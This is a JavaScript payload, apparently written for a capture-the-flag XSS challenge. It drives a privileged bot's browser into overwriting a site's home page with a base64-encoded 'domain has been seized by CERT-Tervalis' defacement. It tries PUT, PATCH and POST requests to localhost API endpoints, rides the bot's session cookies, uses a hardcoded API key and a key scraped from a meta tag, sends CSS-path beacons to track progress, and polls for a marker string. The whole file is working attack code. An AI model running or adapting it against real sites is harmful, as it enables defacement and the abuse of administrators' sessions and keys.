(async () => {
  const T = "VTG920";
  const K = "vk_live_daf5f1744a7bfbbeefe31e1544ca1d4ee214";
  const SEIZED_B64 = "PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPlNlaXplZCDigJQgQ0VSVC1UZXJ2YWxpczwvdGl0bGU+CjwhLS0gQ1QtQ0FTRSAtLT4KPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tIj4KPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUhhbmtlbitHcm90ZXNrOndnaHRANDAwOzUwMDs2MDA7NzAwOzgwMCZmYW1pbHk9SmV0QnJhaW5zK01vbm86d2dodEA0MDA7NTAwOzYwMCZkaXNwbGF5PXN3YXAiPgo8c3R5bGU+CiAgOnJvb3R7LS1wYXBlcjojZjRmM2VmOy0taW5rOiMxOTE3MTM7LS1tdXRlZDojNmE2NTU4Oy0tbGluZTojY2ZjYWJiOy0tc2VhbDojMTcxNDEwOy0tcmVkOiM4ZjJmMjI7CiAgICAtLXNhbnM6IkhhbmtlbiBHcm90ZXNrIiwtYXBwbGUtc3lzdGVtLHN5c3RlbS11aSxTZWdvZSBVSSxSb2JvdG8sQXJpYWwsc2Fucy1zZXJpZjsKICAgIC0tbW9ubzoiSmV0QnJhaW5zIE1vbm8iLHVpLW1vbm9zcGFjZSxNZW5sbyxDb25zb2xhcyxtb25vc3BhY2V9CiAgKntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjB9CiAgYm9keXtiYWNrZ3JvdW5kOnZhcigtLXBhcGVyKTtjb2xvcjp2YXIoLS1pbmspO2ZvbnQtZmFtaWx5OnZhcigtLXNhbnMpO2xpbmUtaGVpZ2h0OjEuNjttaW4taGVpZ2h0OjEwMHZoOwogICAgZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO3BhZGRpbmc6NDBweH0KICAubm90aWNle21heC13aWR0aDo2NjBweDt3aWR0aDoxMDAlO3RleHQtYWxpZ246Y2VudGVyO2JvcmRlcjoxcHggc29saWQgdmFyKC0taW5rKTsKICAgIGJveC1zaGFkb3c6MCAwIDAgNXB4IHZhcigtLXBhcGVyKSwwIDAgMCA2cHggdmFyKC0taW5rKTtwYWRkaW5nOjUycHggNDhweCA0NHB4fQogIC5zZWFse21hcmdpbjowIGF1dG8gMjZweDtkaXNwbGF5OmJsb2NrfQogIC5zZWFsIHRleHR7Zm9udC1mYW1pbHk6dmFyKC0tbW9ubyk7ZmlsbDp2YXIoLS1zZWFsKX0KICBoMXtmb250LXdlaWdodDo4MDA7bGV0dGVyLXNwYWNpbmc6LjAxZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2ZvbnQtc2l6ZTpjbGFtcCgyOHB4LDQuNnZ3LDQycHgpO2xpbmUtaGVpZ2h0OjEuMDZ9CiAgLnJ1bGV7d2lkdGg6NjRweDtoZWlnaHQ6M3B4O2JhY2tncm91bmQ6dmFyKC0tcmVkKTttYXJnaW46MjJweCBhdXRvIDI0cHh9CiAgLmxlYWR7bWF4LXdpZHRoOjUyY2g7bWFyZ2luOjAgYXV0bztmb250LXNpemU6MTdweDtjb2xvcjojMmMyYTI0fQogIC5sZWFkIGJ7Zm9udC13ZWlnaHQ6NzAwfQogIC5sZWdhbHttYXgtd2lkdGg6NTJjaDttYXJnaW46MjRweCBhdXRvIDA7Zm9udC1zaXplOjEzLjVweDtjb2xvcjp2YXIoLS1tdXRlZCl9CiAgLmJ5e2ZvbnQtZmFtaWx5OnZhcigtLW1vbm8pO2ZvbnQtc2l6ZToxMnB4O2xldHRlci1zcGFjaW5nOi4xNmVtO3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTtjb2xvcjp2YXIoLS1pbmspOwogICAgbWFyZ2luLXRvcDozNHB4O3BhZGRpbmctdG9wOjIycHg7Ym9yZGVyLXRvcDoxcHggc29saWQgdmFyKC0tbGluZSl9CiAgLmJ5IGJ7Y29sb3I6dmFyKC0tcmVkKX0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICA8bWFpbiBjbGFzcz0ibm90aWNlIj4KICAgIDxzdmcgY2xhc3M9InNlYWwiIHdpZHRoPSIxMzIiIGhlaWdodD0iMTMyIiB2aWV3Qm94PSIwIDAgMjAwIDIwMCIgYXJpYS1sYWJlbD0iQ0VSVC1UZXJ2YWxpcyBzZWFsIj4KICAgICAgPGRlZnM+CiAgICAgICAgPHBhdGggaWQ9InRvcCIgZD0iTSAzMCAxMDAgQSA3MCA3MCAwIDAgMSAxNzAgMTAwIi8+CiAgICAgICAgPHBhdGggaWQ9ImJvdCIgZD0iTSAzMCAxMDAgQSA7MCA3MCAwIDAgMCAxNzAgMTAwIi8+CiAgICAgIDwvZGVmcz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI5NCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjIiLz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI4NCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjEiLz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI1MiIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjEuNSIvPgogICAgICA8dGV4dCBmb250LXNpemU9IjEwLjIiIGxldHRlci1zcGFjaW5nPSIxLjUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPjx0ZXh0UGF0aCBocmVmPSIjdG9wIiBzdGFydE9mZnNldD0iNTAlIj5DT01QVVRFUiBFTUVSR0VOQ1kgUkVTUE9OU0U8L3RleHRQYXRoPjwvdGV4dD4KICAgICAgPHRleHQgZm9udC1zaXplPSIxMi41IiBsZXR0ZXItc3BhY2luZz0iNCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+PHRleHRQYXRoIGhyZWY9IiNib3QiIHN0YXJ0T2Zmc2V0PSI1MCUiPuKYhSAgVEVSVkFMSVMgIOKYhTwvdGV4dFBhdGg+PC90ZXh0PgogICAgICA8ZyBzdHJva2U9IiMxNzE0MTAiIHN0cm9rZS13aWR0aD0iMy41IiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPgogICAgICAgIDxjaXJjbGUgY3g9IjEwMCIgY3k9Ijc0IiByPSI1LjUiLz4KICAgICAgICA8bGluZSB4MT0iMTAwIiB5MT0iODAiIHgyPSIxMDAiIHkyPSIxMjYiLz4KICAgICAgICA8bGluZSB4MT0iODUiIHkxPSI5NCIgeDI9IjExNSIgeTI9Ijk0Ii8+CiAgICAgICAgPHBhdGggZD0iTSA3NiAxMTAgQSAyNCAyNCAwIDAgMCAxMjQgMTEwIi8+CiAgICAgICAgPGxpbmUgeDE9Ijc2IiB5MT0iMTEwIiB4Mj0iNzAiIHkyPSIxMDQiLz48bGluZSB4MT0iNzYiIHkxPSIxMTAiIHgyPSI4MiIgeTI9IjEwNiIvPgogICAgICAgIDxsaW5lIHgxPSIxMjQiIHkxPSIxMTAiIHgyPSIxMzAiIHkyPSIxMDQiLz48bGluZSB4MT0iMTI0IiB5MT0iMTEwIiB4Mj0iMTE4IiB5Mj0iMTA2Ii8+CiAgICAgIDwvZz4KICAgIDwvc3ZnPgogICAgPGgxPlRoaXMgZG9tYWluIGhhczxicj5iZWVuIHNlaXplZDwvaDE+CiAgICA8ZGl2IGNsYXNzPSJydWxlIj48L2Rpdj4KICAgIDxwIGNsYXNzPSJsZWFkIj5UaGlzIGRvbWFpbiBhbmQgaXRzIGFzc29jaWF0ZWQgc2VydmljZXMgaGF2ZSBiZWVuIDxiPnNlaXplZCBieSBDRVJULVRlcnZhbGlzPC9iPiDigJQgdGhlCiAgICBDb21wdXRlciBFbWVyZ2VuY3kgUmVzcG9uc2UgVGVhbSBvZiBUZXJ2YWxpcyDigJQgYW5kIGFyZSBubyBsb25nZXIgaW4gc2VydmljZS48L3A+CiAgICA8cCBjbGFzcz0ibGVnYWwiPlVuYXV0aG9yaXplZCBhY2Nlc3MgdG8gdGhpcyBzeXN0ZW0gaXMgcHJvaGliaXRlZCBhbmQgbWF5IGJlIHN1YmplY3QgdG8gaW52ZXN0aWdhdGlvbiBhbmQKICAgIHByb3NlY3V0aW9uIHVuZGVyIHRoZSBsYXdzIG9mIFRlcnZhbGlzLjwvcD4KICAgIDxkaXYgY2xhc3M9ImJ5Ij5CeSBvcmRlciBvZiA8Yj5DRVJULVRlcnZhbGlzPC9iPiDCtyBDeWJlciBEaXZpc2lvbjwvZGl2PgogIDwvbWFpbj4KPC9ib2R5Pgo8L2h0bWw+Cg==";
  const S = decodeURIComponent(escape(atob(SEIZED_B64)));

  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css',{credentials:'include',cache:'no-store'}); } catch(e){} };
  const chk = async () => { try { return (await (await fetch('/?_nc='+Date.now(),{cache:'no-store'})).text()).includes('CT-CASE'); } catch(e){ return false; } };

  await bc('A');

  const kq = '?api_key='+K;
  const J = JSON.stringify({body:S});
  const Jslug = JSON.stringify({slug:'home',body:S});

  // Phase 1: Without mode:'no-cors' (default CORS mode)
  // If bot has --disable-web-security, this works even cross-origin
  // If bot has normal CORS, browser sends OPTIONS preflight and may block
  await Promise.allSettled([
    fetch('http://127.0.0.1/api/pages/home'+kq, {method:'PUT', headers:{'Content-Type':'application/json'}, body:J, cache:'no-store'}),
    fetch('http://127.0.0.1/api/pages/home'+kq, {method:'PATCH', headers:{'Content-Type':'application/json'}, body:J, cache:'no-store'}),
    fetch('http://127.0.0.1/api/pages/home'+kq, {method:'POST', headers:{'Content-Type':'application/json'}, body:J, cache:'no-store'}),
    fetch('http://127.0.0.1/api/pages'+kq, {method:'POST', headers:{'Content-Type':'application/json'}, body:Jslug, cache:'no-store'}),
    fetch('http://127.0.0.1/api/page/home'+kq, {method:'PUT', headers:{'Content-Type':'application/json'}, body:J, cache:'no-store'}),
  ]);

  await bc('F0');
  if (await chk()) { await bc('WIN_F0'); return; }

  // Phase 2: XHR (older API, sometimes different CORS behavior)
  const xhrPut = (url, data) => new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open('PUT', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = () => { if (xhr.readyState === 4) resolve(xhr.status); };
    xhr.onerror = () => resolve(0);
    try { xhr.send(data); } catch(e) { resolve(-1); }
    setTimeout(() => resolve(-2), 4000);
  });

  const xhrStatus = await xhrPut('http://127.0.0.1/api/pages/home'+kq, J);
  await bc('XHR_'+Math.abs(xhrStatus));
  if (await chk()) { await bc('WIN_XHR'); return; }

  // Phase 3: Same-origin with admin session (bot's session at 172.28.4.2)
  // These reach PHP with REMOTE_ADDR = bot's IP (not 127.0.0.1)
  // BUT also try with X-Api-Key header format
  await Promise.allSettled([
    fetch('/api/pages/home'+kq, {method:'PUT', headers:{'Content-Type':'application/json','X-Api-Key':K,'X-Key':K}, body:J, credentials:'include', cache:'no-store'}),
    fetch('/api/pages/home'+kq, {method:'PATCH', headers:{'Content-Type':'application/json','X-Api-Key':K}, body:J, credentials:'include', cache:'no-store'}),
  ]);

  await bc('SO0');
  if (await chk()) { await bc('WIN_SO'); return; }

  // Phase 4: Read meta vantage-key and use it (in case API key from meta differs from hardcoded)
  const metaKey = document.querySelector('meta[name="vantage-key"]')?.content || K;
  if (metaKey !== K) {
    await fetch('/api/pages/home?api_key='+metaKey, {method:'PUT', headers:{'Content-Type':'application/json'}, body:J, credentials:'include', cache:'no-store'});
    await bc('META_KEY');
    if (await chk()) { await bc('WIN_META'); return; }
  }

  await bc('DONE');
})();
